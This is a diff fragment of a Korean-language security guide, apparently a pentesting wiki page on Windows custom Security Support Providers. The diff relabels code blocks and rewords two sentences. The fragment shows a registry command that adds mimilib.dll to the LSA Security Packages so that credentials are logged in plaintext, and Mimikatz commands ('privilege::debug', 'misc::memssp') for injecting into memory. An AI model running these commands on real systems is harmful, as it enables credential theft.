@@ -19,19 +19,19 @@ HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
 `mimilib.dll`를 보안 지원 공급자 목록(보안 패키지)에 추가합니다:
-```powershell
+```bash
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
 재부팅 후 모든 자격 증명은 `C:\Windows\System32\kiwissp.log`에 평문으로 저장됩니다.
 
 #### 메모리 내
 
-Mimikatz를 사용하여 메모리에 직접 주입할 수도 있습니다(약간 불안정하거나 작동하지 않을 수 있습니다):
-```powershell
+Mimikatz를 사용하여 메모리에 직접 주입할 수도 있습니다(약간 불안정하거나 작동하지 않을 수 있습니다).
+```bash
 privilege::debug
 misc::memssp
 ```
-이것은 재부팅 후에도 유지되지 않습니다.
+이것은 재부팅 시 유지되지 않습니다.
 
 #### 완화
 
